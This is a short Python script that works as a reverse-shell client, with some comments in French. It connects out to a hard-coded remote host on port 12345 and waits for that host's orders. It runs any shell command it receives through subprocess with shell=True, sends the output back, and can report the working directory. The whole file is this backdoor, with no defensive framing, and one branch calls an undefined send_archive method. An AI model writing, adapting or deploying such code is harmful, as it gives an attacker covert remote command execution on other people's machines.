import socket
import os
import subprocess
from time import sleep
import json
from urllib import request

IP = "FRANCOISBRIC127"
port = 12345
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, int(port)))
s.send("Connexion établie !".encode("utf-8"))

class Client:
    def __init__(self, DATA):
        self.DATA = DATA
    
    def verifications(DATA):
        print

        if(DATA == str.encode("command")):
            
            command = s.recv(1024)
            Client.command(command.decode("utf-8"))

        if(DATA == str.encode("home")):
            s.send(os.getcwd().encode())
        
        if(DATA == str.encode("exit")):
            s.close()
            exit()

        if(DATA == str.encode("filesend")):
            Client.send_archive(DATA)

        # if(DATA == str.encode("dir")):
        #     s.send(os.)  
        
    def command(DATA):
        sub = subprocess.Popen(DATA, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        output = sub.stderr.read()+sub.stdout.read()
        s.send(output)

while True:
    try: 
        rcvc = s.recv(1024)
        Client.verifications(rcvc)
    except KeyboardInterrupt:
        s.close()
        exit()


